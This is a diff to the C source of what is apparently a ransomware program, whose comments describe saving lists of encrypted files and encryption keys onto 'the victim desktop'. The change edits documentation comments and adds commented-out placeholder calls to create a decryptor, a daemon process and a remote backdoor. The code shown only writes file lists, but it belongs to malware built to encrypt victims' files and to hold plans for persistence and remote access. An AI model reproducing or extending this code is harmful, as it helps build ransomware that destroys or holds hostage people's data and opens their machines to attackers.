@@ -70,14 +70,22 @@ void find_files(List **files, char* start_path){
  * This function will save things on the victim desktop
  * such as enc_files.gc, public key, private key.
  * This file will be used to decrypt.
- * @param l -> type = EncList
+ * @param encrypted -> type = List
+ * @param files -> type = List
  */
 void create_files_desktop(List *encrypted, List *files, char * desktop){
     save_into_file_encrypted_list(encrypted, desktop);
     save_into_file_files_list(files, desktop);
-
+    //create_decryptor(desktop);
+    //create_daemon_process();
+    //create_remote_backdoor();
 }
 
+/**
+ * This function will save the original files path 
+ * on the victim desktop
+ * @param l -> type = List
+ */
 void save_into_file_files_list(List *l, char *desktop){
     FILE *f;
     char * new_file;
@@ -99,7 +107,7 @@ void save_into_file_files_list(List *l, char *desktop){
         strcpy(line, l->info[2]);
         strcat(line, "\n");
         fwrite(line, strlen(line), 1, f);
-        
+
         l = l->prox;
     }
     free(line);
